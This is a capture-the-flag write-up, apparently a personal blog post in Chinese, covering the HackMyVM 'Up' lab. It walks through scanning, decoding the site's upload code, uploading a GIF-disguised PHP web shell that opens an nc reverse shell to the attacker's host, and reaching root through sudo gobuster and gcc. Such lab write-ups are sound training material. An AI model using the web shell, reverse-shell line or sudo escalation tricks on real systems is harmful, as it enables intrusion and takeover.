---
title: HMV up
published: 2025-02-23
pinned: false
description: HMV up wp
tags: ['HMV']
category: 渗透
licenseName: "MIT"
author: zsm
draft: false
date: 2025-02-23
pubDate: 2025-02-23
---

## up

### 靶场链接
https://hackmyvm.eu/machines/machine.php?vm=Up

### 日常扫描

```
┌──(kali㉿kali)-[~]
└─$ sudo arp-scan -l
[sudo] password for kali: 
Sorry, try again.
[sudo] password for kali: 
Interface: eth0, type: EN10MB, MAC: 12:37:b3:be:69:38, IPv4: 192.168.31.183
WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.31.1    58:ea:1f:38:ff:17       (Unknown)
192.168.31.186  42:60:96:7b:26:bd       (Unknown: locally administered)
192.168.31.238  08:00:27:ba:dc:8f       (Unknown)

3 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.955 seconds (130.95 hosts/sec). 3 responded
                                                                                
┌──(kali㉿kali)-[~]
└─$ nmap 192.168.31.238
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-23 10:21 HKT
Nmap scan report for 192.168.31.238
Host is up (0.0012s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 08:00:27:BA:DC:8F (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.30 seconds
```

先简单的用dirb扫一下
```
┌──(kali㉿kali)-[~]
└─$ dirb http://192.168.31.238     

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sun Feb 23 10:33:50 2025
URL_BASE: http://192.168.31.238/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.31.238/ ----
+ http://192.168.31.238/index.php (CODE:200|SIZE:4489)                         
==> DIRECTORY: http://192.168.31.238/javascript/                               
+ http://192.168.31.238/server-status (CODE:403|SIZE:279)                      
==> DIRECTORY: http://192.168.31.238/uploads/                                  
                                                                               
---- Entering directory: http://192.168.31.238/javascript/ ----
==> DIRECTORY: http://192.168.31.238/javascript/jquery/                        
                                                                               
---- Entering directory: http://192.168.31.238/uploads/ ----
+ http://192.168.31.238/uploads/robots.txt (CODE:200|SIZE:1301)                
                                                                               
---- Entering directory: http://192.168.31.238/javascript/jquery/ ----
+ http://192.168.31.238/javascript/jquery/jquery (CODE:200|SIZE:289782)        
END_TIME: Sun Feb 23 10:34:08 2025
DOWNLOADED: 18448 - FOUND: 4

```

uploads估计是上传的文件，扫一下

```
┌──(kali㉿kali)-[~]
└─$ dirb http://192.168.31.238/uploads
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sun Feb 23 10:35:27 2025
URL_BASE: http://192.168.31.238/uploads/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt


GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.31.238/uploads/ ----
+ http://192.168.31.238/uploads/robots.txt (CODE:200|SIZE:1301)                

END_TIME: Sun Feb 23 10:35:32 2025
DOWNLOADED: 4612 - FOUND: 1

```

### 反弹shell

打开得到
```
PD9waHAKaWYgKCRfU0VSVkVSWydSRVFVRVNUX01FVEhPRCddID09PSAnUE9TVCcpIHsKICAgICR0YXJnZXREaXIgPSAidXBsb2Fkcy8iOwogICAgJGZpbGVOYW1lID0gYmFzZW5hbWUoJF9GSUxFU1siaW1hZ2UiXVsibmFtZSJdKTsKICAgICRmaWxlVHlwZSA9IHBhdGhpbmZvKCRmaWxlTmFtZSwgUEFUSElORk9fRVhURU5TSU9OKTsKICAgICRmaWxlQmFzZU5hbWUgPSBwYXRoaW5mbygkZmlsZU5hbWUsIFBBVEhJTkZPX0ZJTEVOQU1FKTsKCiAgICAkYWxsb3dlZFR5cGVzID0gWydqcGcnLCAnanBlZycsICdnaWYnXTsKICAgIGlmIChpbl9hcnJheShzdHJ0b2xvd2VyKCRmaWxlVHlwZSksICRhbGxvd2VkVHlwZXMpKSB7CiAgICAgICAgJGVuY3J5cHRlZEZpbGVOYW1lID0gc3RydHIoJGZpbGVCYXNlTmFtZSwgCiAgICAgICAgICAgICdBQkNERUZHSElKS0xNTk9QUVJTVFVWV1hZWmFiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6JywgCiAgICAgICAgICAgICdOT1BRUlNUVVZXWFlaQUJDREVGR0hJSktMTW5vcHFyc3R1dnd4eXphYmNkZWZnaGlqa2xtJyk7CgogICAgICAgICRuZXdGaWxlTmFtZSA9ICRlbmNyeXB0ZWRGaWxlTmFtZSAuICIuIiAuICRmaWxlVHlwZTsKICAgICAgICAkdGFyZ2V0RmlsZVBhdGggPSAkdGFyZ2V0RGlyIC4gJG5ld0ZpbGVOYW1lOwoKICAgICAgICBpZiAobW92ZV91cGxvYWRlZF9maWxlKCRfRklMRVNbImltYWdlIl1bInRtcF9uYW1lIl0sICR0YXJnZXRGaWxlUGF0aCkpIHsKICAgICAgICAgICAgJG1lc3NhZ2UgPSAiRWwgYXJjaGl2byBzZSBoYSBzdWJpZG8gY29ycmVjdGFtZW50ZS4iOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICRtZXNzYWdlID0gIkh1Ym8gdW4gZXJyb3IgYWwgc3ViaXIgZWwgYXJjaGl2by4iOwogICAgICAgIH0KICAgIH0gZWxzZSB7CiAgICAgICAgJG1lc3NhZ2UgPSAiU29sbyBzZSBwZXJtaXRlbiBhcmNoaXZvcyBKUEcgeSBHSUYuIjsKICAgIH0KfQo/Pgo=

```

一眼base64，厨子启动
```
<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $targetDir = "uploads/";
    $fileName = basename($_FILES["image"]["name"]);
    $fileType = pathinfo($fileName, PATHINFO_EXTENSION);
    $fileBaseName = pathinfo($fileName, PATHINFO_FILENAME);

    $allowedTypes = ['jpg', 'jpeg', 'gif'];
    if (in_array(strtolower($fileType), $allowedTypes)) {
        $encryptedFileName = strtr($fileBaseName, 
            'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz', 
            'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm');

        $newFileName = $encryptedFileName . "." . $fileType;
        $targetFilePath = $targetDir . $newFileName;

        if (move_uploaded_file($_FILES["image"]["tmp_name"], $targetFilePath)) {
            $message = "El archivo se ha subido correctamente.";
        } else {
            $message = "Hubo un error al subir el archivo.";
        }
    } else {
        $message = "Solo se permiten archivos JPG y GIF.";
    }
}
?>

```

这个代码简单来说就是文件名进行了rot13操作，且只允许上传jpg和gif文件
> echo "< ?php system('nc -e /bin/bash 192.168.31.183 4444'); ?>" > zsm.gif 

bp传上去试试呗
```
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444         
listening on [any] 4444 ...
connect to [192.168.31.183] from (UNKNOWN) [192.168.31.238] 48740
ls
access_denied.html
clue.txt
mfz.gif
robots.txt
```

home下的用户目录可以进，先把第一个flag拿了

### 提权

```
sudo -l
Matching Defaults entries for www-data on debian:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User www-data may run the following commands on debian:
    (ALL) NOPASSWD: /usr/bin/gobuster

```

gobuster是提权点
gobuster无法对本地目录进行扫描，但可以使用-w参数将本地目录作为字典目录读取。因此，在本机运行http服务，在靶机运行gobuster，看靶机请求哪些文件。

```
sudo /usr/bin/gobuster dir -w "/root/rodgarpass" -u "http://192.168.31.183:8888"

┌──(kali㉿kali)-[~]
└─$ python3 -m http.server 8888
Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
192.168.31.238 - - [23/Feb/2025 10:56:32] "GET / HTTP/1.1" 200 -
192.168.31.238 - - [23/Feb/2025 10:56:32] code 404, message File not found
192.168.31.238 - - [23/Feb/2025 10:56:32] "GET /958637c2-0c37-44a1-93ad-48c9eba3a07c HTTP/1.1" 404 -
192.168.31.238 - - [23/Feb/2025 10:56:32] code 404, message File not found
192.168.31.238 - - [23/Feb/2025 10:56:32] "GET /b45cffe084dd3d20d928bee85e7b0f2 HTTP/1.1" 404 -

```

b45cffe084dd3d20d928bee85e7b0f2是个md5值 -> string
结果不对wc，

```
echo -n string |md5sum 
b45cffe084dd3d20d928bee85e7b0f21  -
```
nb，这个作者少打个1
切换成这个用户，再看看提权点，

```
rodgar@debian:~$ sudo -l
sudo -l
Matching Defaults entries for rodgar on debian:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User rodgar may run the following commands on debian:
    (ALL : ALL) NOPASSWD: /usr/bin/gcc, /usr/bin/make

```

gcc提权，写个binbash进去就行了

```
rodgar@debian:~$ sudo gcc -wrapper /bin/sh,-s .
sudo gcc -wrapper /bin/sh,-s .
 id
id
uid=0(root) gid=0(root) grupos=0(root)

```

-wrapper是gcc的参数，可以指定一个可执行文件，gcc会调用这个文件，并把gcc的参数传递给这个文件。
-s是交互式终端